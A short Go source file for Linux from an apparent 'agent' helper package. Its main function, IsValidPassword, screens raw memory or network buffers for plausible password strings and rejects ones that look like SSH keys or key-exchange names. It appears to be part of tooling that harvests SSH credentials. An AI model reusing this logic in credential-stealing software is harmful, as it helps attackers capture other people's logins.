//go:build linux

package agent_helper

import (
	"fmt"
	"galleon/debug"
	"strings"
	"unicode"
)

func Contains(slice []int, value int) bool {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}

func RemoveNonPrintableAscii(input string) string {
	var resultBuilder []rune

	for _, char := range input {
		if unicode.IsPrint(char) && char >= 32 && char != 127 {
			resultBuilder = append(resultBuilder, char)
		}
	}

	return string(resultBuilder)
}

func IsValidPassword(s string) bool {
	if debug.Debug {
		fmt.Printf("[*] Validating potential password:\n%s\n", s)
	}
	// likely not less than 3 and not more than 100 
	if len(s) < 3 || len(s) > 100 {
		return false
	}

	printableCount := 0
	replacementCharCount := 0

	for _, r := range s {
		if r >= 32 && r < 127 {
			printableCount++
		} else if r == 0xFFFD {
			replacementCharCount++
		}
	}

	if replacementCharCount > len(s)/5 {
		if debug.Debug {
			fmt.Printf("[*] Rejecting password for high replacemeent char count, buffer:\n%s\n", s)
		}
		return false
	}

	if printableCount < len(s)*4/5 {
		if debug.Debug {
			fmt.Printf("[*] Rejecting password for low printable char count, buffer:\n%s\n", s)
		}
		return false
	}

	lower := strings.ToLower(s)
	if strings.HasPrefix(lower, "fsha256") ||
		strings.HasPrefix(lower, "ssh-") ||
		strings.HasPrefix(lower, "ecdsa-") ||
		strings.HasPrefix(lower, "rsa-") ||
		strings.HasPrefix(lower, "ed25519") ||
		strings.Contains(lower, "curve25519") ||
		strings.Contains(lower, "diffie-hellman") ||
		strings.Contains(lower, "sntrup") {
		if debug.Debug {
			fmt.Printf("[*] Rejecting password for looking like a public key, buffer:\n%s\n", s)
		}
		return false
	}
	if debug.Debug {
		fmt.Printf("[*] Accepting password, buffer:\n%s\n", s)
	}
	return true
}
